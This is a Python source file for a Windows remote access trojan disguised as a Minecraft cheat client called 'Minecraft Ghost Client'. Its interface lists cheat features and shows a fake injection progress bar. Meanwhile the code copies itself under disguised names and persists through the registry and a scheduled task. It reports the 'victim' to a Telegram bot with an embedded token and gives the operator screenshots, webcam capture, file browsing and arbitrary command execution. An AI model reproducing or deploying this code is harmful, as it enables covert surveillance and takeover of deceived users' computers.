import os
import sys
import ctypes
import subprocess
import threading
import time
import shutil
import winreg
import random
import io
from datetime import datetime
import tkinter as tk
from tkinter import ttk, messagebox
import requests
import telebot
from telebot import types
import pyautogui
import psutil
from PIL import Image, ImageGrab
import cv2
import socket

# ================== НАСТРОЙКИ ==================
TOKEN = "8169017410:AAFUwW6QwYGg06hfR1ggv2y89D2DsuhAyN8"   # Токен бота (получить у @BotFather)
ALLOWED_USERS = [5907010682]         # Твой Telegram ID (узнать у @userinfobot)
YOUR_TG = "@corenthack"             # Твой Telegram
BOT_NAME = "@skejsjdnrbbhrbot"

# ================== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ==================
bot = None
rat_active = False

# ================== ПРОВЕРКА ПРАВ АДМИНА ==================
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def request_admin():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, " ".join(sys.argv), None, 1
        )
        sys.exit()

# ================== ПОЛУЧЕНИЕ IP ==================
def get_ip():
    try:
        return requests.get('https://api.ipify.org', timeout=3).text
    except:
        return "Unknown"

# ================== RAT ФУНКЦИИ ==================

def setup_persistence():
    """Устанавливает RAT в систему"""
    try:
        paths = [
            os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Caches', 'javaw.exe'),
            os.path.join(os.environ['APPDATA'], 'Oracle', 'Java', 'java_update.exe'),
            os.path.join(os.environ['TEMP'], 'system32', 'svchost.exe')
        ]
        
        for path in paths:
            os.makedirs(os.path.dirname(path), exist_ok=True)
        
        current = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        
        for target in paths:
            try:
                if not os.path.exists(target):
                    shutil.copy2(current, target)
                    ctypes.windll.kernel32.SetFileAttributesW(target, 2)
            except:
                pass
        
        # Автозагрузка через реестр
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "JavaUpdate", 0, winreg.REG_SZ, paths[0])
        
        # Планировщик задач
        subprocess.run(f'schtasks /create /tn "JavaUpdateTask" /tr "{paths[0]}" /sc minute /mo 30 /f', 
                      shell=True, capture_output=True)
        
        return True
    except:
        return False

def self_destruct():
    """Полное самоуничтожение"""
    try:
        # Удаляем из автозагрузки
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
                winreg.DeleteValue(key, "JavaUpdate")
        except:
            pass
        
        # Удаляем задачу
        try:
            subprocess.run('schtasks /delete /tn "JavaUpdateTask" /f', shell=True, capture_output=True)
        except:
            pass
        
        # Получаем путь к текущему файлу
        current = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        
        # Создаём BAT для самоудаления
        bat_content = f'''@echo off
timeout /t 2 /nobreak > nul
del /f /q "{current}"
del /f /q "%~f0"
'''
        bat_path = os.path.join(os.environ['TEMP'], 'cleanup.bat')
        with open(bat_path, 'w') as f:
            f.write(bat_content)
        
        subprocess.Popen(['cmd.exe', '/c', bat_path], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        sys.exit(0)
    except:
        pass

def press_alt_f4():
    """Эмулирует нажатие Alt+F4"""
    try:
        ctypes.windll.user32.keybd_event(0x12, 0, 0, 0)  # ALT down
        ctypes.windll.user32.keybd_event(0x73, 0, 0, 0)  # F4 down
        time.sleep(0.1)
        ctypes.windll.user32.keybd_event(0x73, 0, 2, 0)  # F4 up
        ctypes.windll.user32.keybd_event(0x12, 0, 2, 0)  # ALT up
        return True
    except:
        return False

def show_message_box(text, title="System Message", msg_type="info"):
    """Показывает системное окно"""
    msg_types = {
        "info": 0x40,
        "warning": 0x30,
        "error": 0x10,
        "question": 0x20,
        "yesno": 0x04 | 0x20,
        "okcancel": 0x01 | 0x30,
    }
    
    btn_type = msg_types.get(msg_type, 0x40)
    
    try:
        result = ctypes.windll.user32.MessageBoxA(
            0,
            text.encode('cp1251'),
            title.encode('cp1251'),
            btn_type
        )
        
        result_text = ""
        if msg_type in ["yesno", "question"]:
            result_text = "✅ Да" if result == 6 else "❌ Нет"
        elif msg_type == "okcancel":
            result_text = "✅ OK" if result == 1 else "❌ Отмена"
        
        return True, result_text
    except:
        return False, "Ошибка"

def set_volume(level):
    """Устанавливает громкость (0-100)"""
    try:
        from ctypes import cast, POINTER
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume.SetMasterVolumeLevelScalar(level / 100, None)
        return True, f"Громкость: {level}%"
    except ImportError:
        return False, "pycaw не установлен"
    except:
        return False, "Ошибка звука"

def take_webcam_photo():
    """Фото с веб-камеры"""
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return False, None
        
        ret, frame = cap.read()
        cap.release()
        
        if ret:
            _, img_encoded = cv2.imencode('.jpg', frame)
            img_bytes = io.BytesIO(img_encoded.tobytes())
            return True, img_bytes
        else:
            return False, None
    except:
        return False, None

def take_screenshot():
    """Скриншот экрана"""
    try:
        screenshot = pyautogui.screenshot()
        img_bytes = io.BytesIO()
        screenshot.save(img_bytes, format='PNG')
        img_bytes.seek(0)
        return True, img_bytes
    except:
        return False, None

def send_telegram_notification():
    """Отправляет уведомление в Telegram"""
    try:
        global bot
        bot = telebot.TeleBot(TOKEN)
        
        pc_name = os.environ.get('COMPUTERNAME', 'Unknown')
        user_name = os.environ.get('USERNAME', 'Unknown')
        ip = get_ip()
        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        message = f"""
🚀 **MINECRAFT GHOST CLIENT УСТАНОВЛЕН!**

🎮 **Чит:** Minecraft Ghost Client
👤 **Жертва:** {user_name}
💻 **Компьютер:** {pc_name}
🌐 **IP:** {ip}
⏰ **Время:** {current_time}

**TG: {YOUR_TG}**
        """
        
        for user_id in ALLOWED_USERS:
            try:
                bot.send_message(user_id, message, parse_mode="Markdown")
            except:
                pass
        
        setup_bot_handlers()
        start_bot_thread()
    except:
        pass

# ================== НАСТРОЙКА TELEGRAM БОТА ==================

def setup_bot_handlers():
    """Настраивает обработчики команд бота"""
    
    @bot.message_handler(commands=['start', 'menu'])
    def show_menu(message):
        if message.from_user.id not in ALLOWED_USERS:
            bot.reply_to(message, "⛔ Нет доступа")
            return
        
        # Создаём клавиатуру с кнопками
        markup = types.InlineKeyboardMarkup(row_width=2)
        
        # РЯД 1 - Экран и камера
        btn1 = types.InlineKeyboardButton("📸 Скриншот", callback_data="screenshot")
        btn2 = types.InlineKeyboardButton("🎥 Веб-камера", callback_data="webcam")
        
        # РЯД 2 - Звук
        btn3 = types.InlineKeyboardButton("🔊 Звук вкл/выкл", callback_data="mute")
        btn4 = types.InlineKeyboardButton("🔉 Громкость -", callback_data="vol_down")
        btn5 = types.InlineKeyboardButton("🔊 Громкость +", callback_data="vol_up")
        
        # РЯД 3 - Обои и ссылки
        btn6 = types.InlineKeyboardButton("🖼️ Обои", callback_data="wallpaper")
        btn7 = types.InlineKeyboardButton("🌐 Открыть ссылку", callback_data="open_url")
        
        # РЯД 4 - Инфо и файлы
        btn8 = types.InlineKeyboardButton("💻 Инфо", callback_data="info")
        btn9 = types.InlineKeyboardButton("📁 Файлы", callback_data="files")
        
        # РЯД 5 - Процессы и CMD
        btn10 = types.InlineKeyboardButton("📋 Процессы", callback_data="processes")
        btn11 = types.InlineKeyboardButton("⚡ CMD", callback_data="cmd")
        
        # РЯД 6 - Управление ПК
        btn12 = types.InlineKeyboardButton("🔄 Перезагрузка", callback_data="reboot")
        btn13 = types.InlineKeyboardButton("⏻ Выключение", callback_data="shutdown")
        
        # РЯД 7 - Системные сообщения
        btn14 = types.InlineKeyboardButton("ℹ️ Инфо окно", callback_data="msg_info")
        btn15 = types.InlineKeyboardButton("⚠️ Предупреждение", callback_data="msg_warning")
        btn16 = types.InlineKeyboardButton("❌ Ошибка", callback_data="msg_error")
        btn17 = types.InlineKeyboardButton("❓ Вопрос", callback_data="msg_question")
        
        # РЯД 8 - Специальные функции
        btn18 = types.InlineKeyboardButton("❌ Alt+F4", callback_data="altf4")
        btn19 = types.InlineKeyboardButton("💀 Самоуничтожение", callback_data="selfdestruct")
        
        # Добавляем все кнопки
        markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8, btn9,
                   btn10, btn11, btn12, btn13, btn14, btn15, btn16, btn17, btn18, btn19)
        
        bot.send_message(
            message.chat.id,
            f"🤖 **MINECRAFT RAT УПРАВЛЕНИЕ**\n\n"
            f"Компьютер: {os.environ.get('COMPUTERNAME', 'Unknown')}\n"
            f"Пользователь: {os.environ.get('USERNAME', 'Unknown')}\n"
            f"IP: {get_ip()}\n"
            f"Время: {datetime.now().strftime('%H:%M:%S')}\n\n"
            f"Выбери действие:",
            parse_mode="Markdown",
            reply_markup=markup
        )

    @bot.callback_query_handler(func=lambda call: True)
    def handle_buttons(call):
        if call.from_user.id not in ALLOWED_USERS:
            bot.answer_callback_query(call.id, "⛔ Нет доступа")
            return
        
        action = call.data
        
        # ===== СКРИНШОТ =====
        if action == "screenshot":
            try:
                bot.answer_callback_query(call.id, "📸 Делаю скриншот...")
                success, img_bytes = take_screenshot()
                if success:
                    bot.send_photo(call.message.chat.id, img_bytes, caption="📸 Скриншот экрана")
                else:
                    bot.send_message(call.message.chat.id, "❌ Ошибка")
            except Exception as e:
                bot.send_message(call.message.chat.id, f"❌ Ошибка: {str(e)}")
        
        # ===== ВЕБ-КАМЕРА =====
        elif action == "webcam":
            try:
                bot.answer_callback_query(call.id, "🎥 Делаю фото...")
                success, img_bytes = take_webcam_photo()
                if success:
                    bot.send_photo(call.message.chat.id, img_bytes, caption="🎥 С веб-камеры")
                else:
                    bot.send_message(call.message.chat.id, "❌ Камера не найдена")
            except Exception as e:
                bot.send_message(call.message.chat.id, f"❌ Ошибка: {str(e)}")
        
        # ===== ЗВУК ВКЛ/ВЫКЛ =====
        elif action == "mute":
            try:
                from ctypes import cast, POINTER
                from comtypes import CLSCTX_ALL
                from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
                
                devices = AudioUtilities.GetSpeakers()
                interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                volume = cast(interface, POINTER(IAudioEndpointVolume))
                
                current = volume.GetMute()
                volume.SetMute(0 if current else 1, None)
                bot.send_message(call.message.chat.id, f"{'🔇 Выключен' if not current else '🔊 Включен'}")
            except Exception as e:
                bot.send_message(call.message.chat.id, f"❌ Ошибка: {str(e)}")
        
        # ===== ГРОМКОСТЬ - =====
        elif action == "vol_down":
            try:
                from ctypes import cast, POINTER
                from comtypes import CLSCTX_ALL
                from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
                
                devices = AudioUtilities.GetSpeakers()
                interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                volume = cast(interface, POINTER(IAudioEndpointVolume))
                
                current = volume.GetMasterVolumeLevelScalar()
                new_vol = max(0.0, current - 0.1)
                volume.SetMasterVolumeLevelScalar(new_vol, None)
                bot.send_message(call.message.chat.id, f"🔉 Громкость: {int(new_vol*100)}%")
            except Exception as e:
                bot.send_message(call.message.chat.id, f"❌ Ошибка: {str(e)}")
        
        # ===== ГРОМКОСТЬ + =====
        elif action == "vol_up":
            try:
                from ctypes import cast, POINTER
                from comtypes import CLSCTX_ALL
                from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
                
                devices = AudioUtilities.GetSpeakers()
                interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                volume = cast(interface, POINTER(IAudioEndpointVolume))
                
                current = volume.GetMasterVolumeLevelScalar()
                new_vol = min(1.0, current + 0.1)
                volume.SetMasterVolumeLevelScalar(new_vol, None)
                bot.send_message(call.message.chat.id, f"🔊 Громкость: {int(new_vol*100)}%")
            except Exception as e:
                bot.send_message(call.message.chat.id, f"❌ Ошибка: {str(e)}")
        
        # ===== ОБОИ =====
        elif action == "wallpaper":
            try:
                url = "https://picsum.photos/1920/1080"
                response = requests.get(url, timeout=5)
                img = Image.open(io.BytesIO(response.content))
                
                temp_file = os.path.join(os.environ['TEMP'], 'wallpaper.jpg')
                img.save(temp_file)
                
                ctypes.windll.user32.SystemParametersInfoW(20, 0, temp_file, 3)
                bot.send_message(call.message.chat.id, "🖼️ Обои изменены")
                os.remove(temp_file)
            except Exception as e:
                bot.send_message(call.message.chat.id, f"❌ Ошибка: {str(e)}")
        
        # ===== ОТКРЫТЬ ССЫЛКУ =====
        elif action == "open_url":
            msg = bot.send_message(call.message.chat.id, "🌐 Введи URL (например https://google.com):")
            bot.register_next_step_handler(msg, process_url)
        
        # ===== ИНФО =====
        elif action == "info":
            try:
                cpu = psutil.cpu_percent(interval=1)
                mem = psutil.virtual_memory()
                disk = psutil.disk_usage('/')
                boot_time = datetime.fromtimestamp(psutil.boot_time())
                uptime = datetime.now() - boot_time
                
                info = f"""💻 **СИСТЕМА**
                
**Процессор:** {cpu}%
**ОЗУ:** {mem.percent}% ({mem.used//1024**2}MB/{mem.total//1024**2}MB)
**Диск C:** {disk.percent}% ({disk.free//1024**3}GB свободно)
**Пользователь:** {os.environ.get('USERNAME', 'Unknown')}
**Компьютер:** {os.environ.get('COMPUTERNAME', 'Unknown')}
**Время работы:** {uptime.days}д {uptime.seconds//3600}ч
**IP:** {get_ip()}
"""
                bot.send_message(call.message.chat.id, info, parse_mode="Markdown")
            except Exception as e:
                bot.send_message(call.message.chat.id, f"❌ Ошибка: {str(e)}")
        
        # ===== ФАЙЛЫ =====
        elif action == "files":
            msg = bot.send_message(call.message.chat.id, "📁 Введи путь к папке (или Enter для рабочего стола):")
            bot.register_next_step_handler(msg, process_files)
        
        # ===== ПРОЦЕССЫ =====
        elif action == "processes":
            try:
                processes = []
                for proc in psutil.process_iter(['pid', 'name', 'cpu_percent']):
                    try:
                        processes.append(f"`{proc.info['pid']}` | {proc.info['name']} | CPU: {proc.info['cpu_percent']:.1f}%")
                    except:
                        pass
                
                text = "📋 **ПРОЦЕССЫ (первые 30):**\n\n"
                for i, p in enumerate(processes[:30]):
                    text += p + "\n"
                
                if len(processes) > 30:
                    text += f"\n... и еще {len(processes) - 30}"
                
                bot.send_message(call.message.chat.id, text, parse_mode="Markdown")
            except Exception as e:
                bot.send_message(call.message.chat.id, f"❌ Ошибка: {str(e)}")
        
        # ===== CMD =====
        elif action == "cmd":
            msg = bot.send_message(call.message.chat.id, "⚡ Введи команду CMD:")
            bot.register_next_step_handler(msg, process_cmd)
        
        # ===== ПЕРЕЗАГРУЗКА =====
        elif action == "reboot":
            if not is_admin():
                bot.send_message(call.message.chat.id, "⚠️ Требуются права администратора")
            else:
                bot.send_message(call.message.chat.id, "⚠️ Перезагрузка через 10 секунд...")
                time.sleep(10)
                os.system('shutdown /r /t 5')
        
        # ===== ВЫКЛЮЧЕНИЕ =====
        elif action == "shutdown":
            if not is_admin():
                bot.send_message(call.message.chat.id, "⚠️ Требуются права администратора")
            else:
                bot.send_message(call.message.chat.id, "⚠️ Выключение через 10 секунд...")
                time.sleep(10)
                os.system('shutdown /s /t 5')
        
        # ===== СИСТЕМНЫЕ СООБЩЕНИЯ =====
        elif action == "msg_info":
            msg = bot.send_message(call.message.chat.id, "ℹ️ Введи текст информационного сообщения:")
            bot.register_next_step_handler(msg, lambda m: process_message_box(m, "info"))
        elif action == "msg_warning":
            msg = bot.send_message(call.message.chat.id, "⚠️ Введи текст предупреждения:")
            bot.register_next_step_handler(msg, lambda m: process_message_box(m, "warning"))
        elif action == "msg_error":
            msg = bot.send_message(call.message.chat.id, "❌ Введи текст ошибки:")
            bot.register_next_step_handler(msg, lambda m: process_message_box(m, "error"))
        elif action == "msg_question":
            msg = bot.send_message(call.message.chat.id, "❓ Введи текст вопроса:")
            bot.register_next_step_handler(msg, lambda m: process_message_box(m, "question"))
        
        # ===== ALT+F4 =====
        elif action == "altf4":
            if press_alt_f4():
                bot.send_message(call.message.chat.id, "✅ Alt+F4 нажато")
            else:
                bot.send_message(call.message.chat.id, "❌ Ошибка")
        
        # ===== САМОУНИЧТОЖЕНИЕ =====
        elif action == "selfdestruct":
            # Подтверждение
            markup = types.InlineKeyboardMarkup()
            btn_yes = types.InlineKeyboardButton("✅ Да, удалить", callback_data="selfdestruct_confirm")
            btn_no = types.InlineKeyboardButton("❌ Нет", callback_data="selfdestruct_cancel")
            markup.add(btn_yes, btn_no)
            
            bot.send_message(
                call.message.chat.id,
                "⚠️ **ВНИМАНИЕ!**\n\nЭто полностью удалит программу с компьютера и все следы.\n\nТочно продолжить?",
                parse_mode="Markdown",
                reply_markup=markup
            )
        
        elif action == "selfdestruct_confirm":
            bot.send_message(call.message.chat.id, "💀 Запускаю самоуничтожение... Прощай!")
            time.sleep(2)
            self_destruct()
        
        elif action == "selfdestruct_cancel":
            bot.send_message(call.message.chat.id, "✅ Самоуничтожение отменено")

def process_url(message):
    url = message.text.strip()
    if url:
        try:
            import webbrowser
            if not url.startswith(('http://', 'https://')):
                url = 'https://' + url
            webbrowser.open(url)
            bot.send_message(message.chat.id, f"🌐 Открыто: {url}")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Ошибка: {str(e)}")

def process_files(message):
    path = message.text.strip()
    if not path:
        path = os.path.expanduser("~\\Desktop")
    
    try:
        if os.path.exists(path):
            files = os.listdir(path)[:30]
            text = f"📁 **{path}**\n\n"
            for f in files:
                full = os.path.join(path, f)
                if os.path.isdir(full):
                    text += f"📁 {f}\n"
                else:
                    size = os.path.getsize(full)
                    if size < 1024:
                        text += f"📄 {f} ({size} B)\n"
                    elif size < 1024**2:
                        text += f"📄 {f} ({size/1024:.1f} KB)\n"
                    else:
                        text += f"📄 {f} ({size/1024**2:.1f} MB)\n"
            bot.send_message(message.chat.id, text, parse_mode="Markdown")
        else:
            bot.send_message(message.chat.id, "❌ Путь не найден")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка: {str(e)}")

def process_cmd(message):
    cmd = message.text.strip()
    if not cmd:
        return
    
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
        output = result.stdout or result.stderr or "✅ Готово"
        if len(output) > 3000:
            output = output[:3000] + "...\n(обрезано)"
        bot.send_message(message.chat.id, f"```\n{output}\n```", parse_mode="Markdown")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка: {str(e)}")

def process_message_box(message, msg_type):
    text = message.text.strip()
    if text:
        success, result = show_message_box(text, "System Message", msg_type)
        if success:
            bot.send_message(message.chat.id, f"✅ Сообщение отправлено\nРезультат: {result}")
        else:
            bot.send_message(message.chat.id, f"❌ Ошибка: {result}")

def start_bot_thread():
    def bot_worker():
        while True:
            try:
                bot.polling(none_stop=True, interval=0, timeout=20)
            except:
                time.sleep(5)
    
    thread = threading.Thread(target=bot_worker, daemon=True)
    thread.start()

# ================== ИНТЕРФЕЙС MINECRAFT ЧИТА ==================

class MinecraftCheat:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title(f"Minecraft Ghost Client v3.2 | {YOUR_TG}")
        self.root.geometry("750x550")
        self.root.resizable(False, False)
        self.root.attributes('-alpha', 0.95)
        
        self.center_window()
        
        # Цвета
        self.bg_color = "#1E1E1E"
        self.fg_color = "#55FF55"
        self.btn_color = "#2D2D2D"
        self.text_color = "#FFFFFF"
        
        self.root.configure(bg=self.bg_color)
        
        # Заголовок
        title_frame = tk.Frame(self.root, bg=self.bg_color)
        title_frame.pack(pady=20)
        
        title = tk.Label(
            title_frame,
            text=f"MINECRAFT GHOST CLIENT\nby {YOUR_TG}",
            font=("Arial", 24, "bold"),
            bg=self.bg_color,
            fg=self.fg_color
        )
        title.pack()
        
        # Версии
        version_frame = tk.Frame(self.root, bg=self.bg_color)
        version_frame.pack()
        
        versions = ["1.8.9 ✓", "1.12.2 ✓", "1.16.5 ✓", "1.19.4 ✓", "1.20.1 ✓"]
        for ver in versions:
            lbl = tk.Label(
                version_frame,
                text=ver,
                font=("Arial", 10),
                bg=self.bg_color,
                fg="#4CAF50",
                padx=10
            )
            lbl.pack(side="left")
        
        # Функции
        features_frame = tk.Frame(self.root, bg=self.bg_color)
        features_frame.pack(pady=20, padx=30, fill="both", expand=True)
        
        left_frame = tk.Frame(features_frame, bg=self.bg_color)
        left_frame.pack(side="left", fill="both", expand=True, padx=10)
        
        combat_title = tk.Label(
            left_frame,
            text="⚔️ COMBAT",
            font=("Arial", 14, "bold"),
            bg=self.bg_color,
            fg="#FF5555"
        )
        combat_title.pack(pady=(0,10))
        
        combat_funcs = [
            "✓ KillAura (3.5-4.5 CPS)",
            "✓ Criticals (100%)",
            "✓ Velocity (100%)",
            "✓ AutoClicker (8-20 CPS)",
            "✓ Reach (3.2-3.8)",
            "✓ HitBox (расширение)",
            "✓ AimAssist",
            "✓ AutoTotem"
        ]
        
        for func in combat_funcs:
            lbl = tk.Label(
                left_frame,
                text=func,
                font=("Arial", 10),
                bg=self.bg_color,
                fg="#AAAAAA",
                anchor="w"
            )
            lbl.pack(pady=2, fill="x")
        
        center_frame = tk.Frame(features_frame, bg=self.bg_color)
        center_frame.pack(side="left", fill="both", expand=True, padx=10)
        
        move_title = tk.Label(
            center_frame,
            text="🏃 MOVEMENT",
            font=("Arial", 14, "bold"),
            bg=self.bg_color,
            fg="#5555FF"
        )
        move_title.pack(pady=(0,10))
        
        move_funcs = [
            "✓ Fly (7 modes)",
            "✓ Speed (3 modes)",
            "✓ BunnyHop",
            "✓ Spider",
            "✓ Step (1.5 blocks)",
            "✓ NoSlow (100%)",
            "✓ Sprint",
            "✓ Jesus"
        ]
        
        for func in move_funcs:
            lbl = tk.Label(
                center_frame,
                text=func,
                font=("Arial", 10),
                bg=self.bg_color,
                fg="#AAAAAA",
                anchor="w"
            )
            lbl.pack(pady=2, fill="x")
        
        right_frame = tk.Frame(features_frame, bg=self.bg_color)
        right_frame.pack(side="left", fill="both", expand=True, padx=10)
        
        render_title = tk.Label(
            right_frame,
            text="👁️ RENDER",
            font=("Arial", 14, "bold"),
            bg=self.bg_color,
            fg="#FFFF55"
        )
        render_title.pack(pady=(0,10))
        
        render_funcs = [
            "✓ ESP (2D/3D)",
            "✓ Tracers",
            "✓ Chams",
            "✓ Fullbright",
            "✓ NoFog",
            "✓ Nametags",
            "✓ ItemESP",
            "✓ X-Ray"
        ]
        
        for func in render_funcs:
            lbl = tk.Label(
                right_frame,
                text=func,
                font=("Arial", 10),
                bg=self.bg_color,
                fg="#AAAAAA",
                anchor="w"
            )
            lbl.pack(pady=2, fill="x")
        
        # Статус
        status_frame = tk.Frame(self.root, bg=self.bg_color)
        status_frame.pack(pady=10)
        
        self.status_label = tk.Label(
            status_frame,
            text="● СТАТУС: ОЖИДАНИЕ",
            font=("Arial", 11),
            bg=self.bg_color,
            fg="#FFAA00"
        )
        self.status_label.pack()
        
        # Прогресс
        self.progress = ttk.Progressbar(
            self.root,
            length=500,
            mode='indeterminate',
            style="green.Horizontal.TProgressbar"
        )
        self.progress.pack(pady=10)
        
        # Кнопка INJECT
        inject_btn = tk.Button(
            self.root,
            text="💉 INJECT / ЗАПУСТИТЬ КЛИЕНТ",
            font=("Arial", 16, "bold"),
            bg="#4CAF50",
            fg="white",
            padx=40,
            pady=15,
            command=self.on_inject_click,
            cursor="hand2"
        )
        inject_btn.pack(pady=20)
        
        # Предупреждение
        warning = tk.Label(
            self.root,
            text="⚠ ОБХОД АНТИЧИТА | НЕ ДЕТЕКТИТСЯ | РАБОТАЕТ НА ЛЮБЫХ СЕРВЕРАХ",
            font=("Arial", 9),
            bg=self.bg_color,
            fg="#FFAA00"
        )
        warning.pack()
        
        # Подвал
        footer = tk.Label(
            self.root,
            text=f"© {YOUR_TG} | Discord: {YOUR_TG} | Версия 3.2 | Forge/Fabric/Lunar",
            font=("Arial", 8),
            bg=self.bg_color,
            fg="#666666"
        )
        footer.pack(side="bottom", pady=5)
        
        self.injected = False
    
    def center_window(self):
        self.root.update_idletasks()
        width = self.root.winfo_width()
        height = self.root.winfo_height()
        x = (self.root.winfo_screenwidth() // 2) - (width // 2)
        y = (self.root.winfo_screenheight() // 2) - (height // 2)
        self.root.geometry(f'{width}x{height}+{x}+{y}')
    
    def on_inject_click(self):
        if self.injected:
            messagebox.showinfo("Уже запущено", "Клиент уже активирован!")
            return
        
        self.status_label.config(text="● АКТИВАЦИЯ...", fg="#FFAA00")
        self.progress.start(10)
        
        threading.Thread(target=self.inject_rat, daemon=True).start()
    
    def inject_rat(self):
        try:
            steps = [
                "Подключение к серверу...",
                "Загрузка маппингов...",
                "Инжект в процесс javaw.exe...",
                "Обход античита...",
                "Загрузка модулей..."
            ]
            
            for i, step in enumerate(steps):
                time.sleep(0.5)
                self.progress['value'] = (i+1) * 20
                self.progress.update()
                self.root.after(0, lambda s=step: self.status_label.config(text=f"● {s}"))
            
            setup_persistence()
            send_telegram_notification()
            
            self.root.after(0, self.inject_success)
        except Exception as e:
            self.root.after(0, lambda: self.inject_error(str(e)))
    
    def inject_success(self):
        self.progress.stop()
        self.status_label.config(text="● КЛИЕНТ АКТИВИРОВАН ✓", fg="#4CAF50")
        self.injected = True
        
        messagebox.showinfo(
            "Успешно!",
            f"✅ Minecraft Ghost Client активирован!\n\n"
            f"Нажми RIGHT SHIFT для открытия меню\n"
            f"Все модули работают в фоне\n\n"
            f"TG: {YOUR_TG}"
        )
        
        self.root.iconify()
    
    def inject_error(self, error):
        self.progress.stop()
        self.status_label.config(text="● ОШИБКА", fg="#FF0000")
        messagebox.showerror("Ошибка", f"Не удалось активировать клиент:\n{error}")
    
    def run(self):
        self.root.mainloop()

# ================== ЗАПУСК ==================
if __name__ == "__main__":
    request_admin()
    app = MinecraftCheat()
    app.run()